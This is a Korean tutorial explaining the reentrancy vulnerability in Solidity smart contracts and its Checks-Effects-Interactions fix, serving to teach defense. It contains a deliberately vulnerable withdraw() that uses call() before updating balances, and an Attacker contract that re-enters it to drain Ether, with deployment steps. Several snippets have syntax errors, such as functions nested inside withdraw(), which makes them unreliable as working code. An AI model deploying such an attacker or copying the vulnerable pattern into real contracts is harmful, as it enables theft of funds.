# 재진입(Reentrancy) 문제

address 타입이 제공하는 transfer()와 send()함수로 이더를 전송하는 경우는 수신하는 컨트랙트의 receive() 함수 내에서 가용한 가스(2300) 제약이 있음. 이러한 제약 조건은 "재진입"공격에 대한 방어 수단이 됨. 
> ** 2300가스로 할 수 있는 일
> - 이더 보내기
> - 상태 변수에 값 저장하기
> - 다른 컨트랙트의 함수 호출하기

transfer()와 send()를 쓰지 않고 이더를 보낼 수 있는 방법은 저수준 호출 call()을 사용하는 것인데, 이 경우 재진입문제가 발생할 수 있음.

예시)
```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Donation {
    mapping(address => uint256) balances;

    function donate(address  _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _addr) public view returns (uint balance) {
        return balances[_addr];
    }

    function withdraw(uint256 _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool bOk, ) = msg.sender.call{value:_amount}("");

            if(!bOk) {
                revert();
            }

            unchecked { balances[msg.sender] -= _amount;}
        }

        receive() external payable {}

        function getBalance() public view returns (uint256) {
            return address(this).balance;
        }
    }
}
```
donate()를 호출하여 특정 계정에 이더를 기부하면 기부 받은 계정은 자신에게 기부된 이더를 withdraw() 함수를 호출하여 인출할 수 있음. 기부를 받은 계정들과 기부 수량은 mapping 타입의 balances 장부에 기록이 되므로 받은 수량 이내에서만 인출할 수 있음.

하지만, 인출할 때 사용된 이더 송금을 위해 call()을 사용함.
➔ call()은 transfer()나 send()와는 다르게 2300 가스 제한 없이 트랙잭션을 시작할 때의 가스가 그대로 전달되므로 남은 가스가 충분하다면 다른 코드를 실핼할 수 있음.
⇒ 공격자는 이러한 점을 악용하여 컨트랙트를 공격할 수 있음

공격 컨트랙트)
```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "./Donation.sol"

contract Attacker {
    address payable owner;
    uint256 public v = 0.5 ether;
    Donation public donation;

    constructor(address payable _addr) payable {
        owner = payable(msg.sender);
        donation = Donation(_addr);
    }

    function donate external {
        donation.donate{value: v}(address(this));
    }

    receive() external payable {
        if(address(donation).balance >= v) {
            donation.withdraw(v);
        }
    }

    function kill() external {
        selfdestruct(owner);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Attacker 컨트랙트에서 주의깊에 봐야할 부분은 **receive() 함수**  
이더를 받는 함수 안에서 다시 Donation 컨트랙트의 withdraw()함수를 호출함. (←이 코드가 어떻게 Donation 컨트랙트에 기부된 이더를 무단으로 인출하는지가 핵심!!)

> 1. Donation 컨트랙트 배포   
> 2. Attacker 컨트랙트 배포 + 1 이더 전송 (Donation 컨트랙트에 기부용)
> 3. 정상적으로 Donation 컨트랙트에 기부
> 4. donate() 호출 (value 항목에 기부할 수량을 넣고 기부 받는 계정은 임의의 계정을 넣어도 상관 없음)
> 5. 이더가 Donation 컨트랙트에 예치되고, 그 기록은 balances 장부에 기록. (각 계정의 인출 가능 수량은 balanceOf()로 조회할 수 있음)   
> ** 기부를 받은 계정들은 장부에 기록된 기부 수량 이상을 인출할 수 없는 조건이 적용되어 있기 때문에 부정 인출이 일어날 수 없는 것처럼 보임   
 ```solidity
    function withdraw(uint256 _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool bOk, ) = msg.sender.call{value:_amount}("");

            if(!bOk) {
                revert();
            }

            unchecked { balances[msg.sender] -= _amount;}
        }
    }
```
> 6. 공격자는 Attacker 컨트랙트의 donate() 함수를 실행. 이 함수는 Donation 컨트랙트의 donate() 함수를 호출   
→ 그런데 여기서 기부 받는 계정은 Attacker 컨트랙트 자신으로 되어있음!!! 여기서는 0.5 이더를 자신에게 기부하도록 되어있음.
```solidity
function donate() external {
    donation.donate{value: v}(address(this));
}
```
> 7. Donation 컨트랙트의 withdraw 함수를 호출. 호출할 때 receive() 함수 안에서 수행.(→ Donation 컨트랙트의 로직은 withdraw() 함수가 호출되면 이 함수에서는 다시 함수를 호출한 msg.sender에게 요청한 수량 _amount의 이더를 전송하도록 되어 있음)
```solidity
(bool bOk, ) = msg.sender.call{value: _amount}("");
```
> 8. call()을 사용하여 receive()를 호출했기 때문에 트랙젹션을 시작하면서 실행되고 남은 가스가 계속 전달됨.
> 9. `msg.sender = Attacker` 이므로 다시 receive() 함수가 호출되면서 계속 withdraw() 함수로 "재진입"함 (→ 이것은 단일 트랜잭션으로 실행되는데 Donation 컨트랙트의 잔액이 Attacker가 인출해가는 이더 수량보다 작아질 때 까지 계속됨.)
> 10. 인출이 일어나고 있지만 재진입으로 인하여 Attacker 계정의 잔액을 여전히 0.5 이더 상태로 판단하기 때문에 이렇게 연속적인 인출이 가능함

Q. 만약 call()을 사용하지 않고 transfer() 또는 send() 함수를 사용한다면?

```solidity
function withdraw(uint256 _amount) public {
    if(balance[msg.sender] >= _amount) {
        payable(msg.sender).transfer(_amount);
        unchecked{ balance[msg.sender] -= _amount; }
    }
}
```
2300 가스비 제한이 있기 때문에 receive() 함수 안에서는 다른 컨트랙트 함수를 호출할 수 없음. 따라서 Attacker 컨트랙트에서 withdraw()함수를 다시 호출하는 것은 실패
## 이더를 보낼 때 call() 대신 transfer()를 사용하는 것이 일반적이었지만, 이스탄불 하드포크 이후 이러한 기조가 다소 변경
2019년 이스탄불 하드포크에서 EVM의 opcode에 책정된 가스를 변경하면서 하드포크 전에는 2300이내 였던 코드가 2300을 넘어버리는 결과를 초래했기 때문. 따라서 EVM opcode의 가스는 이더리움 클라이언트가 업데이트 되면서 여러가지 이유에 의해 조정될 수 있기 때문에 2300 가스 제한이 있는 transfer()나 send()를 사용하는 것이 바람직하지 않다는 주장이 제기
→ 스마트컨트랙트를 가스에 의존적으로 작성하면 오히려 향후 동작에 문제가 생길 수 있다는 것

따라서, 해결책은
## 다시 call()을 사용,
다시말해서
## "Check-Effects Interations"패턴으로 재진입 문제를 해결하고 call()을 사용
예시)
```solidity
function withdraw(uint256 _amount) public {
    if(balance[msg.sender] >= _amount) {
        unchecked {balance[msg.sender] -= _amount; }

        (bool bOk, ) = msg.sender.call{value: _amount}("");
        if (!bOk) {
            revert();
        }
    }
}
```
> 수정된 코드를 보면 이더를 송금하기 전에 장부 balances의 잔액을 먼저 차감.   
이렇게 되면 재진입이 발생하더라도 장부 상의 데이터는 변경된 상태이기 때문에 인출 한도 이내에서만 전송이 이루어짐. 즉, 상태변수를 먼저 변경하고 그 다음에 외부 전송을 하는 순서로 코드를 작성

완성 코드)
```solidity
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Donation {
    mapping(address => uint256) balances;

    function donate(address  _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _addr) public view returns (uint balance) {
        return balances[_addr];
    }

    function withdraw(uint256 _amount) public {
        if(balances[msg.sender] >= _amount) {
            unchecked { balances[msg.sender] -= _amount;}

            (bool bOk, ) = msg.sender.call{value:_amount}("");

            if(!bOk) {
                revert();
            }
        }
        receive() external payable {}

        function getBalance() public view returns (uint256) {
            return address(this).balance;
        }
    }
}
```